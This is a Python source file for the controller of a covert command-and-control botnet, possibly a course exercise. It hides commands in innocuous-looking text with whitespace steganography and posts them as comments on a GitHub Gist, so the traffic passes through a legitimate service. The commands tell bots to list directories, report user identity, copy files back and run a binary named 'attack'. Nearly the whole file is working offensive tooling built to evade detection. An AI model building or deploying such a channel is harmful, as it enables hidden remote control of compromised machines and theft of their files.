from my_token import MY_TOKEN
import requests
import time
import base64
import subprocess
import steganography
from PIL import Image
from bot import Bot
import pyUnicodeSteganography as STG

class Controller:
    def __init__(self, gist_id, token, url):
        self.gist_id = gist_id
        self.token = token
        self.url = url
        self.headers = {"Authorization": "Bearer " + self.token}
        self.num_messages = 0

    def encode_message(self, message, image_path=None):
        message = "controller: " + message
        enc_msg = STG.encode("This is normal message", message, method="snow")
        return enc_msg

    def decode_message(self, message):
        dec_msg = STG.decode(message, method="snow")
        return dec_msg

    def send_image(self, image_file):
        # Read the image file and encode it as base64
        with open(image_file, 'rb') as f:
            image_data = f.read()
            image_data = base64.b64encode(image_data).decode('utf-8')

        # Create the payload for the Gist
        payload = {
            'body': image_data,
            'description': 'An image file',
            'public': True,
            'files': {
                'image.jpg': {
                    'content': image_data
                }
            }
        }

        # Send the POST request to create the Gist
        response = requests.post(self.url, json=payload, headers=self.headers)

        # Print the response from the server
        print(response.json())

    def check_for_updates(self):
        response = requests.get(self.url, headers=self.headers)

        if response.status_code == 200:
            comments = response.json()
            num_new_messages = 0
            for j, comment in enumerate(comments):
                if j >= self.num_messages:
                    self.handle_message(comment['body'])
                    num_new_messages += 1
            self.num_messages += num_new_messages
        else:
            print(response.json()['message'])

    def handle_message(self, msg):
        msg = self.decode_message(msg)
        sender = msg.split()[0]
        if sender == "bot:":
                print(msg)
    
    def send_command(self, command, path=None, file_name=None, binary_name=None):
        if command == 'w':
            self.post_message(self.encode_message('w'))

        if command == 'ls':
            self.post_message(self.encode_message('ls ' + path))

        if command == 'id':
            self.post_message(self.encode_message('id'))

        if command == 'cp':
            self.post_message(self.encode_message('cp ' + file_name))

        if command == 'bin':
            self.post_message(self.encode_message('bin ' + binary_name))

    def check_alive(self):
        self.post_message("Hi")

    def post_message(self, msg):
        # Send the disguised message to the controller
        data = {"body": msg}
        response = requests.post(self.url, headers=self.headers, json=data)

        if response.status_code == 201:
            print("Comment posted successfully!")
        else:
            print("Failed to post comment. Status code: " + response.status_code)


if __name__ == "__main__":
    GIST_ID = "b13a8ec03c698d771a70ce34595621d6"
    url = f"https://api.github.com/gists/{GIST_ID}/comments"

    controller = Controller(GIST_ID, MY_TOKEN, url)
    bot = Bot(GIST_ID, MY_TOKEN, url)

    controller.send_command('bin', binary_name="attack")

    # while True:
    #     print("controller - check for updates...")
    #     controller.check_for_updates()
    #     # controller.check_alive()
    #     time.sleep(10)